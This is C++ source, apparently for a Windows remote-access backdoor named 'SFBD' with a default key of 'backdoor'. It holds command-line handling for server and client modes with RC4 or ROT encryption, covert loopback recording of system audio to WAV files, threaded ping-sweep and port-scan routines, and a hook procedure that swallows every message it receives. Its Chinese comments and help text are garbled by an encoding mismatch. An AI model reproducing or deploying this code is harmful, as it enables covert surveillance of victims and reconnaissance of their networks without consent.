#include "public.h"
#include "controller.hpp"

bool Config::enable_log = false;
string Config::key = "backdoor";
string Config::encry_mode = "rc4";
string Config::logfile = "SFBD.history";


int main(int argc, char* argv[]) {
    Config c;
    Args p(argc, argv, c);
    return 0;
}

Args::Args(int args_count, char* args_text[], Config& c) {
        this->match(c, args_count, args_text);
        if (c.enable_localarg) this->localarg(c, c.argfile);
}

//�����ļ�ȡ����
void Args::localarg(Config& c, string argfile) {
    fstream file(argfile, ios::in);
    static char** aa = new char* [50];
    int args_count = 0;

    for (int i = 0; i < 50; i++) {
        char* arg = new char[20];
        file >> arg;
        if (strcmp(arg, "") == 0) break;
        aa[i] = arg;
        args_count++;
    }
    this->match(c, args_count, aa);
    file.close();
}

void Args::match(Config& c, int args_count, char* args_text[]) {
    for (int i = 0; i < args_count; i++) {
        if (!strcmp(args_text[i], "-h")) {
            this->all_help();
        }
        else if (!strcmp(args_text[i], "--listen-port")) {
            c.listen_port = atoi(args_text[++i]);
        }
        else if (!strcmp(args_text[i], "--conn-port")) {
            c.conn_port = atoi(args_text[++i]);
        }
        else if (!strcmp(args_text[i], "--max-conn")) {
            c.max_conn = atoi(args_text[++i]);
        }
        else if (!strcmp(args_text[i], "--server")) {
            c.default_mode = "server";
        }
        else if (!strcmp(args_text[i], "--client")) {
            c.default_mode = "client";
        }
        else if (!strcmp(args_text[i], "--host")) {
            c.target = args_text[++i];
        }
        else if (!strcmp(args_text[i], "--log")) {
            c.enable_log = true;
            c.logfile = args_text[++i];
        }
        else if (!strcmp(args_text[i], "--bufsize")) {
            c.bufsize = atoi(args_text[++i]);
        }
        else if (!strcmp(args_text[i], "--passwd")) {
            Config::key = args_text[++i];
        }
        else if (!strcmp(args_text[i], "--enc-mode")) {
            c.encry_mode = args_text[++i];
        }
    }
    if (!c.default_mode.compare("server")) {
        server(c);
    }
    else if (!c.default_mode.compare("client")) {
        client(c);
    }
}

void Args::all_help() {
    string header = "usage: SFBD.exe [-h] [--server/--client] <--option>\n";
    string content = "detail:\n";
    content += "\t--server\t\t���������ģʽ\n";
    content += "\t--client\t\t�����ͻ���ģʽ\n";
    content += "\t--listen-port\t\t�޸ķ����ģʽ�µļ����˿ڣ�Ĭ��Ϊ5180\n";
    content += "\t--max-conn\t\t�޸ķ����ģʽ�»Ự�������������Ĭ��Ϊ10\n";
    content += "\t--host\t\t\tָ�������IP�������ӣ�Ĭ��127.0.0.1\n";
    content += "\t--conn-port\t\tָ������˵Ķ˿ں��������ӣ�Ĭ��5180\n";
    content += "\t--enc-mode <rc4/rot>\tָ��ͨ�ż���ģʽ��Ĭ��Ϊrc4\n";
    content += "\t--passwd\t\tָ��ͨ�ż���ʱʹ�õ���Կ��Ĭ��Ϊbackdoor\n";
    content += "\t--bufsize\t\tָ��������Ϣ�Ļ�������С���ֽڣ���Ĭ��Ϊ51800\n";
    content += "\t--log\t\t\t����������־��ָ����־�ļ���\n";
    cout << header << content << endl;
}


//���û�������,��Ƶ��ʽ��Ϣ
WavWriter::WavWriter(WAVEFORMATEX* fm, string filename) {
    subchunk1Size = (unsigned int)sizeof(*fm) + fm->cbSize;
    fmt = new unsigned char[subchunk1Size];
    blockAlign = fm->nBlockAlign;
    memcpy(fmt, fm, subchunk1Size);
    this->filename = filename;
}

//�ͷ���Դ
WavWriter::~WavWriter() { delete fmt; }

//��ʼ��,����wav�ļ�����ʱ���wav�ļ�ͷ(ռλ)
void WavWriter::init() {
    file.open(filename, ofstream::binary);
    for (int i = 0; i < 44; ++i) file.write((char*)"", 1);
}

//д����Ƶ����
void WavWriter::write(BYTE* data, int length) {
    file.write((char*)data, length * blockAlign);
    file.flush();
}

//��дwav�ļ�ͷ��Ϣ(��Ҫ��д�������ݲ��ܼ����ļ�ͷ�е���Ϣ)���ر��ļ�
void WavWriter::close() {
    int len = file.tellp();
    subchunk2Size = len - (subchunk1Size + 28);
    chunkSize = 36 + subchunk2Size;
    file.seekp(0, file.beg);

    // WAVE HEADER
    file.write("RIFF", 4);
    file.write((char*)&chunkSize, 4);
    file.write("WAVE", 4);
    // FTM HEADER
    file.write("fmt ", 4);
    file.write((char*)&subchunk1Size, 4);
    file.write((char*)fmt, subchunk1Size);
    // DATA HEADER
    file.write("data", 4);
    file.write((char*)&subchunk2Size, 4);

    file.flush();
    file.close();
}

//���캯��,ָ��¼���ļ���,ָ��¼��ʱ��
AudioCapture::AudioCapture(string filename, int time) {
    this->cap_time = time;
    this->filename = filename;
}

//��������,�ͷŶ����ڴ�
AudioCapture::~AudioCapture() {
    delete wav_file;
    CoTaskMemFree(pwfx);
    if (pEnumerator != NULL) pEnumerator->Release();
    if (pDevice != NULL) pDevice->Release();
    if (pAudioClient != NULL) pAudioClient->Release();
    if (pCaptureClient != NULL) pCaptureClient->Release();
    CoUninitialize();
}

//��ʼ��������Ƶ�����������
string AudioCapture::init() {
    //���̷߳�ʽ����COM����
    hr = CoInitialize(NULL);
    if (FAILED(hr)) return "����COM����ʧ��\n";

    //�������,ָ��CLSID(���ʶ��),��ʾ�˶����Ǿۺ�ʽ�����һ����,
    //ָ��������,ָ������ӿ�IID(�ӿڱ�ʶ��),���ڷ��ش˽ӿڵ�ָ��
    hr = CoCreateInstance(CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, IID_IMMDeviceEnumerator, (void**)&pEnumerator);
    if (FAILED(hr)) return "�������ʧ��\n";

    //��ȡĬ����Ƶ����˵�,��ʾ��Ⱦ�豸������������,ָ���˵��豸�Ľ�ɫΪ��ý��,
    //ָ��������Ƶ�˵��豸����ӿڵ�ָ��
    hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
    if (FAILED(hr)) return "��ȡĬ����Ƶ�豸ʧ��\n";

    //��������ָ���ӿڵ�COM����           
    hr = pDevice->Activate(IID_IAudioClient, CLSCTX_ALL, NULL, (void**)&pAudioClient);
    if (FAILED(hr)) return "����COM����ʧ��\n";

    //��ȡ��Ƶ����ʽ
    hr = pAudioClient->GetMixFormat(&pwfx);
    if (FAILED(hr)) return "��ȡ��Ƶ����ʽʧ��\n";

    wav_file = new WavWriter(pwfx, filename);
    hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, hnsRequestedDuration, 0, pwfx, NULL);
    if (FAILED(hr)) return "��ʼ����Ƶ�ͻ���ʧ��\n";

    //��ȡ����Ļ������Ĵ�С
    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    if (FAILED(hr)) return "��ȡ����Ļ�����ʧ��\n";

    //ָ������ӿ�IID,ָ����Ƶ�ͻ���
    hr = pAudioClient->GetService(IID_IAudioCaptureClient, (void**)&pCaptureClient);
    if (FAILED(hr)) return "��ȡ����ʧ��\n";

    //�������Ļ�������ʵ�ʳ���ʱ��
    // REFTIMES_PER_SEC = 10000000
    hnsActualDuration = (double)10000000 * bufferFrameCount / pwfx->nSamplesPerSec;
    return "��ʼ���ɹ�";
}

//����������Ƶֱ�������ò�ֹͣ,�����߳�
string AudioCapture::Recording() {
    string result = this->init() + "\n";
    wav_file->init();
    //��ʼ¼��
    hr = pAudioClient->Start();
    if (FAILED(hr)) return "����¼��ʧ��";

    clock_t kopen = clock();
    //��ѭ��,ֱ��ʵ��¼��ʱ������Ҫ���¼��ʱ��
    while (true) {
        //˯���Գ����ȴ�����һ��Ļ�����
        //REFTIMES_PER_MILLISEC = 10000
        Sleep(hnsActualDuration / 10000 / 2);
        //����ѭ��������
        hr = pCaptureClient->GetNextPacketSize(&packetLength);
        if (FAILED(hr)) "��ȡ��һ�����ݰ���Сʧ��(ѭ������)";

        while (packetLength != 0) {
            //��ȡ���������еĿ�������
            hr = pCaptureClient->GetBuffer(&pData, &numFramesAvailable, &flags, NULL, NULL);
            if (FAILED(hr)) return "��ȡ��������ʧ��";

            wav_file->write(pData, numFramesAvailable);
            hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
            if (FAILED(hr)) return"�ͷŻ�����ʧ��";

            //�˳�ѭ��������
            hr = pCaptureClient->GetNextPacketSize(&packetLength);
            if (FAILED(hr)) return "��ȡ��һ�����ݰ���Сʧ��(ѭ������)";
        }
        //�ж�¼��ʱ��
        int ktime = (double(clock() - kopen) / CLOCKS_PER_SEC) * 1000;
        if (ktime > (cap_time * 1000))  break;
    }
    //ֹͣ������
    wav_file->close();
    hr = pAudioClient->Stop();
    if (FAILED(hr)) return "ֹͣ¼����ʧ��";
    return result + "¼�����";
}

//PINGɨ���߳�
DWORD WINAPI ICMPthread(void* args) {
    ThreadArgs* t = (ThreadArgs*)args;
    string output;
    Controller cont;

    while (true) {
        t->mtx.lock();
        //��ֹͣǰ����ϴε��������
        t->result += output;
        output = "";
        //Ϊ����ֹͣ
        if (t->IPlist.empty()) {
            t->mtx.unlock();
            break;
        }
        //ȡ�����׸�Ԫ�ز�����
        string ip = t->IPlist.front();
        t->IPlist.pop();
        t->mtx.unlock();
        //����ping
        string tmp = cont.Ping_Host(ip, t->TimeOut);
        if (!tmp.compare("alive"))
            output += "ip " + ip + " is alive!\n";
    }
    t->stop = true;
    return 0;
}

//�˿�ɨ���߳�
DWORD WINAPI PORTthread(void* args) {
    ThreadArgs* t = (ThreadArgs*)args;
    string output;
    Controller cont;

    while (true) {
        t->mtx.lock();
        //��ֹͣǰ����ϴε��������
        t->result += output;
        output = "";
        //Ϊ����ֹͣ
        if (t->IPlist.empty()) {
            t->mtx.unlock();
            break;
        }
        //ȡ�����׸�Ԫ�ز�����
        string ip = t->IPlist.front();
        t->IPlist.pop();
        t->mtx.unlock();
        //�������ƶ˿ڣ���¼����
        for (int i = t->StartPort; i < t->EndPort; i++) {
            string tmp = cont.Port_Scan(ip, i, t->TimeOut);
            if (!tmp.compare("open")) {
                output += "IP " + ip + " �˿� " + to_string(i) + " ����\n";
            }
        }
    }
    t->stop = true;

    return 0;
}

LRESULT CALLBACK Hook_ALLMessage(int nCode, WPARAM wParam, LPARAM lParam)
{
    return true;
}
